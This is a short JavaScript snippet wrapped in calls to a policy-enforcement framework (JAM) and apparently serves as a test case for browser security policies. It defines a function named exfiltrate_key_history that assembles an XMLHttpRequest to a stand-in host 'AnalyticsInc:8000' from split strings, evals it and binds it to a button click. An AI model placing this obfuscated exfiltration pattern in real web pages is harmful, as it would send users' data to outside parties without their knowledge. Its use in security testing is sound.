
JAM.startProfile('load');
function exfiltrate_key_history(){var a="xmlhttp=new XMLHt",b="tpRequest();",c="xmlhttp.op",d='en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);',e="xmlhttp.se",f="nd(null);",a=a+b+c+d+e+f;JAM.isEval(eval)?eval("introspect(JAM.policy.pFull) { "+a+" }"):JAM.call(eval,null,[a])}JAM.set(JAM.call(JAM.get(document,"getElementById",JAM.policy.p13),document,["test"],JAM.policy.p13),"onclick",exfiltrate_key_history,JAM.policy.p3)

JAM.stopProfile('load');
